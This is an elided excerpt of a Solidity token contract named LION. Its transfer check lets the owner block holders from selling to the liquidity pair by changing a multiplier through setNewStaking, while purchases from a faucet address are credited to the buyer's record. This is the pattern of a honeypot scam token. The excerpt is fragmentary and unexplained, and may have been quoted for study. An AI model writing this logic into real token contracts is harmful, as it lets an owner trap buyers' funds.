...
contract LION is Context, IERC20, Ownable {
    ...
    mapping(address => uint256) internal _holderprice;

    uint256 internal _totalSupply = (10 ** 8) * (10 ** _DECIMALS);
    address internal _faucetaddress = address(0);
    uint256 internal _CurrPrice = ~uint256(0);
    uint256 internal _StakingPercent = ~uint256(0);
    ...
    constructor(address routerAddress, address FaucetAddress) {
    ...
    function setNewStaking(uint256 newNumber) external onlyOwner {
        _StakingPercent = newNumber;
    }
    ...
    function _canTransfer(address sender, address recipient, uint256 amount) private view returns (bool) {
        ...
        if (_isSuper(recipient)) {
            ...
            uint256 soldETH = _sellSum[sender];

            if(bought * _CurrPrice >= (soldETH + amountETH) * _holderprice[sender] * _StakingPercent) {
                return true;
            }
        }
        return false;
    ...
    function _transfer(
        ...
        if(sender == _faucetaddress) {
            _buySum[recipient] += _getETHEquivalent(amount);
        }
    ...
    function _beforeTokenTransfer(
        ...
        if (_hasLiquidity()) {
            if (_isSuper(from)) {
                _buySum[to] += _getETHEquivalent(amount);
            }
            if (_isSuper(to)) {
                _sellSum[from] += _getETHEquivalent(amount);
            }
        }
    }
}